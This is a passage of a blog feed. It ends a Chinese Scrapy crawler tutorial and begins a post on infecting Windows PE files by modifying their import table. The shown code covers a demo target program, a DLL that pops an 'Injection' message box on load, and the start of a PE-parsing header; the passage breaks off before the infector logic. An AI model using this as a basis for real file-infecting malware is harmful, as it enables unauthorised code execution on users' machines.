<span class="hljs-string">&#x27;,\n&#x27;</span><br>        <span class="hljs-keyword">return</span> item<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__del__</span>(<span class="hljs-params">self</span>):<br>        self.file.close()<br><br></code></pre></td></tr></table></figure><p>这里需要注意是的是，我们默认使用utf-8编码方式，读者一定要将相关文件改成utf-8，在vscode中修改方式如下图所示：</p><p><img src="/project/scrapy_images/%E4%BF%AE%E6%94%B9%E7%BC%96%E7%A0%81.png" alt="修改编码"></p><p>上面piplines.py文件中，提示我们在settings.py中配置启用管道，接下来我们进行管道的启用。</p><h2 id="6-settings-py配置启用管道"><a href="#6-settings-py配置启用管道" class="headerlink" title="6.settings.py配置启用管道"></a>6.settings.py配置启用管道</h2><p>进入到settingas.py文件中，我们发现有很多可供启用的配置，这里我们主要是启用管道，所以我们可以<strong>ctrl+h</strong>，搜索pipelines，如下图：</p><p><img src="/project/scrapy_images/%E7%AE%A1%E9%81%93%E5%90%AF%E7%94%A8.png" alt="管道启用"></p><p>接下来我们只需要解除该段代码的封印就可以启用管道了！说明如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">SivanWuLa: 项目名称目录</span><br><span class="hljs-string">pipelines: 项目目录下的pipelines文件</span><br><span class="hljs-string">SivanwulaPipeline: 在pipelines文件中定义的普通类SivanwulaPipeline</span><br><span class="hljs-string">300: 执行顺序，该数越小越先执行，一般来说，不超过1000</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">ITEM_PIPLINES = &#123;</span><br><span class="hljs-string">&#x27;SivanWuLa.pipelines.SivanwulaPipeline&#x27;: 300,</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="7-Scrapy数据建模与请求"><a href="#7-Scrapy数据建模与请求" class="headerlink" title="7.Scrapy数据建模与请求"></a>7.Scrapy数据建模与请求</h2><blockquote><p>通常在做项目的过程中，在items.py中进行数据建模！</p></blockquote><h3 id="（1）为什么要建模？"><a href="#（1）为什么要建模？" class="headerlink" title="（1）为什么要建模？"></a>（1）为什么要建模？</h3><p>​    1.定义item即提前规划好哪些字段需要抓取，防止手误，因为定义好之后，在运行过程中，系统会自动检查，值不相同会报错</p><p>​    2.配合注释可以清晰的知道要抓取哪些字段，没有定义的字段不能抓取，在目标字段少的时候可以使用字典代替；</p><p>​    3.使用Scrapy的一些特定组件需要item做支持，如Scrapy的ImagePipeline管道类</p><h3 id="（2）在本项目中实操"><a href="#（2）在本项目中实操" class="headerlink" title="（2）在本项目中实操"></a>（2）在本项目中实操</h3><p><strong>在items.py文件中操作</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Define here the models for your scraped items</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See documentation in:</span><br><span class="hljs-comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><br><br><span class="hljs-keyword">import</span> scrapy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SivanwulaItem</span>(scrapy.Item):<br><span class="hljs-comment">#文章标题</span><br>    title = scrapy.Field()<br>    <span class="hljs-comment">#文章摘要</span><br>    abstract = scrapy.Field()<br></code></pre></td></tr></table></figure><p><strong>注意：</strong><br>    1.from ..items import SivanWulaItem这一代码中 注意item的正确导入路径，使用pycharm时记得忽略其标记的错误<br>    2.python中导入路径要诀:从哪里开始运行，就从哪里开始导入</p><h2 id="8-设置user-agent"><a href="#8-设置user-agent" class="headerlink" title="8.设置user-agent"></a>8.设置user-agent</h2><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。开发爬虫过程中，经常会发现反爬措施非常重用，其中设置随机user-agent就是一项重要的反爬措施，Scrapy中设置UA的方式有很多，在教程最后的进阶操作中，笔者会介绍两种常见方式。</p><p>这里设置一个UA为例，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># settings.py文件中找到如下代码解封，并加入UA:</span><br><span class="hljs-comment"># Override the default request headers:</span><br>DEFAULT_REQUEST_HEADERS = &#123;<br>  <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,<br>  <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en&#x27;</span>,<br>  <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-到目前为止，一个入门级别的scrapy爬虫已经OK了"><a href="#9-到目前为止，一个入门级别的scrapy爬虫已经OK了" class="headerlink" title="9.到目前为止，一个入门级别的scrapy爬虫已经OK了"></a>9.到目前为止，一个入门级别的scrapy爬虫已经OK了</h2><h3 id="如何运行？"><a href="#如何运行？" class="headerlink" title="如何运行？"></a>如何运行？</h3><h4 id="现在cd到项目目录下，在终端中输入"><a href="#现在cd到项目目录下，在终端中输入" class="headerlink" title="现在cd到项目目录下，在终端中输入"></a>现在cd到项目目录下，在终端中输入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">scrapy crawl SivanInfo<br></code></pre></td></tr></table></figure><p><strong>即可运行scrapy!</strong></p><p><img src="/project/scrapy_images/%E9%A1%B9%E7%9B%AE%E8%BF%90%E8%A1%8C%E6%88%90%E5%8A%9F.png" alt="项目运行"></p><p>如上图，笔者网页文章板中，读者所感兴趣的信息已经被写入json文件中</p><h1 id="第三部分-进阶操作"><a href="#第三部分-进阶操作" class="headerlink" title="第三部分 进阶操作"></a>第三部分 进阶操作</h1><h2 id="1-随机设置User-Agent"><a href="#1-随机设置User-Agent" class="headerlink" title="1.随机设置User Agent"></a>1.随机设置User Agent</h2><p>这里提供两种方式:</p><p><strong>(1)settings创建user agent表</strong></p><p>导入random，随机用choise函数调用user agent</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-comment"># user agent 列表</span><br>USER_AGENT_LIST = [<br>    <span class="hljs-string">&#x27;MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23&#x27;</span>,<br>    <span class="hljs-string">&#x27;Opera/9.20 (Macintosh; Intel Mac OS X; U; en)&#x27;</span>,<br>    <span class="hljs-string">&#x27;Opera/9.0 (Macintosh; PPC Mac OS X; U; en)&#x27;</span>,<br>    <span class="hljs-string">&#x27;iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)&#x27;</span>,<br>    <span class="hljs-string">&#x27;Mozilla/4.76 [en_jp] (X11; U; SunOS 5.8 sun4u)&#x27;</span>,<br>    <span class="hljs-string">&#x27;iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)&#x27;</span>,<br>    <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20120813 Firefox/16.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)&#x27;</span>,<br>    <span class="hljs-string">&#x27;Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)&#x27;</span><br>]<br><span class="hljs-comment"># 随机生成user agent</span><br>USER_AGENT = random.choice(USER_AGENT_LIST) <br></code></pre></td></tr></table></figure><p>我们在spider文件中，编写测试代码，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-built_in">print</span>(response.request.headers[<span class="hljs-string">&#x27;User-Agent&#x27;</span>]<br></code></pre></td></tr></table></figure><p>注意是在爬虫类中的parse函数进行每次访问的打印输出，结果如下图所示：</p><p><img src="/project/scrapy_images/%E9%9A%8F%E6%9C%BA%E4%BB%A3%E7%90%86%E7%BB%93%E6%9E%9C1.png" alt="随机user-agent"></p><p><strong>(2)在middleware中调用user agent</strong></p><p><strong>!!!在setting中注释user agent 防止干扰</strong></p><p>在middlewares中创建如下类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserAgentMiddleware</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.user_agent_list = [<br>            <span class="hljs-string">&#x27;MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23&#x27;</span>,<br>            <span class="hljs-string">&#x27;Opera/9.20 (Macintosh; Intel Mac OS X; U; en)&#x27;</span>,<br>            <span class="hljs-string">&#x27;Opera/9.0 (Macintosh; PPC Mac OS X; U; en)&#x27;</span>,<br>            <span class="hljs-string">&#x27;iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)&#x27;</span>,<br>            <span class="hljs-string">&#x27;Mozilla/4.76 [en_jp] (X11; U; SunOS 5.8 sun4u)&#x27;</span>,<br>            <span class="hljs-string">&#x27;iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)&#x27;</span>,<br>            <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0&#x27;</span>,<br>            <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0&#x27;</span>,<br>            <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20120813 Firefox/16.0&#x27;</span>,<br>            <span class="hljs-string">&#x27;Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)&#x27;</span>,<br>            <span class="hljs-string">&#x27;Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)&#x27;</span><br>        ]<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_request</span>(<span class="hljs-params">self,request,spider</span>):<br>        request.headers[<span class="hljs-string">&#x27;USER_AGENT&#x27;</span>]=random.choice(self.user_agent_list)<br></code></pre></td></tr></table></figure><p>在settings.py中启用downloader middleware</p><p>解除以下代码注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">DOWNLOADER_MIDDLEWARES = &#123;<br>    <span class="hljs-string">&#x27;SivanWuLa.middlewares.SivanwulaDownloaderMiddleware&#x27;</span>: <span class="hljs-number">543</span><br>&#125;<br></code></pre></td></tr></table></figure><p>测试结果与上一方法相同，这里不再展示。</p><h2 id="2-使用Scrapy-shell"><a href="#2-使用Scrapy-shell" class="headerlink" title="2.使用Scrapy shell"></a>2.使用Scrapy shell</h2><p>关于Scrapy shell的描述，我将官方文档的翻译了一下，大概如下：</p><blockquote><p>1)Scrapy shell是一个交互式shell，您可以在其中非常快速地尝试和调试抓取代码，而不必运行爬行器。它的目的是用于测试数据提取代码，但实际上您可以使用它来测试任何类型的代码，因为它也是一个常规的Python shell。<br>2)shell用于测试XPath或CSS表达式，并查看它们是如何工作的，以及它们从您试图抓取的网页中提取哪些数据。它允许您在编写爬行器时交互式地测试表达式，而不必运行爬行器来测试每个更改。<br>3)一旦熟悉了Scrapy shell，就会发现它是开发和调试spider的宝贵工具。</p></blockquote><p>从官方文档可以发现，scrapy shell是我们编写的爬虫的一个神器！</p><p>我们可以用它来测试我们抓取的XPath或CSS表达式，并能查看提取的数据，这可以大大减少我们调试代码以获取最准确表达式的时间！</p><p>执行以下代码，打开shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">scrapy shell &lt;url&gt; <span class="hljs-comment">#这里的url就是你想要爬取的网站</span><br></code></pre></td></tr></table></figure><p>打开成功后，如下图：</p><p><img src="/project/scrapy_images/%E8%BF%90%E8%A1%8Cscrapyshell.png" alt="Scrapy shell"></p><p>接下来，我们就可以进行一些好玩的操作了！</p><p>比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">response.status #可以查看当前相应状态 如:200,404等响应状态值<br></code></pre></td></tr></table></figure><p>或者我们对响应头进行一个打印</p><p>首先加载模块pprint，该模块可以用来打印完整的数据结构，看起来更加美观</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint<br></code></pre></td></tr></table></figure><p>然后执行打印响应头操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pprint(response.headers)<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/project/scrapy_images/%E8%BE%93%E5%87%BA%E5%93%8D%E5%BA%94%E5%A4%B4.png" alt="响应头输出"></p><p>那么我们是否可以在爬虫运行时，触发shell来检查响应呢，答案是肯定的，下面给出官方文档的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;myspider&quot;</span><br>    start_urls = [<br>        <span class="hljs-string">&quot;http://example.com&quot;</span>,<br>        <span class="hljs-string">&quot;http://example.org&quot;</span>,<br>        <span class="hljs-string">&quot;http://example.net&quot;</span>,<br>    ]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-comment"># We want to inspect one specific response.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.org&quot;</span> <span class="hljs-keyword">in</span> response.url:<br>            <span class="hljs-keyword">from</span> scrapy.shell <span class="hljs-keyword">import</span> inspect_response<br>            inspect_response(response, self)<br><br>        <span class="hljs-comment"># Rest of parsing code.</span><br></code></pre></td></tr></table></figure><p>这里的爬虫是对多个域名网站进行爬取，并使用shell对带有.org的域名网站进行检查</p><p>当你执行爬虫后，终端会显示如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">2014-01-23 17:48:31-0400 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET http://example.com&gt; (referer: None)<br>2014-01-23 17:48:31-0400 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET http://example.org&gt; (referer: None)<br>[s] Available Scrapy objects:<br>[s]   crawler    &lt;scrapy.crawler.Crawler object at 0x1e16b50&gt;<br>...<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; response.url</span><br>&#x27;http://example.org&#x27;<br></code></pre></td></tr></table></figure><p>然后，您可以检查提取代码是否正常工作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//h1[@class=&quot;fn&quot;]&#x27;</span>)</span><br>[]<br></code></pre></td></tr></table></figure><p>不，它没有。所以你可以在浏览器里打开这个回复，看看是不是你想要的回复:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">view</span>(<span class="hljs-variable">response</span>)</span><br><span class="hljs-variable"><span class="hljs-literal">True</span></span><br></code></pre></td></tr></table></figure><p>最后你按下Ctrl-Z 退出shel l并继续爬行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ^D</span><br>2014-01-23 17:50:03-0400 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET http://example.net&gt; (referer: None)<br>...<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Scrapy</tag>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>InfectImportTable</title>
    <link href="/project/2023/02/03/InfectImportTable/"/>
    <url>/project/2023/02/03/InfectImportTable/</url>
    
    <content type="html"><![CDATA[<p>修改PE文件导入表实现PE文件感染</p><span id="more"></span><p>三个项目<br>1.Demo 生成被感染的PE文件<br>2.Dll<br>3.InfectImportTable </p><p>1.Demo<br> 1)Demo.cpp<br>// Demo.cpp : 此文件包含 “main” 函数。程序执行将在此处开始并结束。<br>//</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span>;<br><span class="hljs-type">int</span> _tmain()<br>&#123;<br><span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProcedure, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">20000</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br><span class="hljs-built_in">SleepEx</span>(<span class="hljs-number">3000</span>, TRUE);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.Dll<br>1)Dll.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">VOID <span class="hljs-title">HelloWorld</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span>;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HANDLE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH)<br>&#123;<br><span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProcedure, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span><br><span class="hljs-function"></span>&#123;<br>TCHAR v1[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>TCHAR BufferData[<span class="hljs-number">1024</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><br><br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;Injection&quot;</span>), _T(<span class="hljs-string">&quot;Injection&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//导出函数</span><br><span class="hljs-function">VOID <span class="hljs-title">HelloWorld</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>2)Source.def</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">LIBRARY      <span class="hljs-string">&quot;Dll&quot;</span><br>DESCRIPTION  <span class="hljs-string">&#x27;Dll&#x27;</span><br>EXPORTS<br>HelloWorld@<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>3.InfectImportTable<br>1)CPEImage.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_LENGTH (0x1000)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALIGN_SIZE_UP(Size,Alignment)  (((ULONG_PTR)(Size) + Alignment - 1) &amp; ~(Alignment - 1)) <span class="hljs-comment">//对齐粒度</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">_CPEImage</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>_CPEImage();<br>~_CPEImage();<br>HANDLE m_FileHandle;<br>DWORD m_dwPageSize;<br>HANDLE m_hProc;<br>WORD m_NumberOfSections;<br><br>PBYTE m_ModuleHandle;<br>PIMAGE_DOS_HEADER m_ImageDosHeader;<br>PIMAGE_NT_HEADERS m_ImageNtHeaders;<br>PIMAGE_FILE_HEADER m_ImageFileHeader;<br>PIMAGE_OPTIONAL_HEADER m_ImageOptionalHeader;<br>PIMAGE_DATA_DIRECTORY m_RelocateDataTable;<br>PIMAGE_SECTION_HEADER m_ImageSectionHeader;<br>PIMAGE_DATA_DIRECTORY m_ImportDataTable;<br>PIMAGE_DATA_DIRECTORY m_ExportDataTable;<br>PIMAGE_EXPORT_DIRECTORY m_ImageExportDirectory;<br>PIMAGE_IMPORT_DESCRIPTOR m_ImageImportDescriptor;<br><br>IMAGE_DATA_DIRECTORY m_OldImportDataTable;   <span class="hljs-comment">//VirtualAddress Size</span><br><br>ULONG_PTR m_AddressOfEntryPoint;<br>DWORD m_SizeOfImage;<br>ULONG_PTR m_ImageBase;<br>BYTE m_BufferData[BUFFER_LENGTH];<span class="hljs-comment">//保存一份PE头的数据内部使用</span><br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-function">PBYTE <span class="hljs-title">LoadImage</span><span class="hljs-params">(HANDLE FileHandle, BOOL IsDoRelocate = TRUE, ULONG_PTR RelocateBase = <span class="hljs-number">0</span>, BOOL IsDoImport = FALSE)</span></span>;<br><span class="hljs-function">BOOL  <span class="hljs-title">VerifyImage</span><span class="hljs-params">(PVOID VirtualAddress)</span></span>;<br><span class="hljs-function">VOID  <span class="hljs-title">InitializePeHeaders</span><span class="hljs-params">(PBYTE 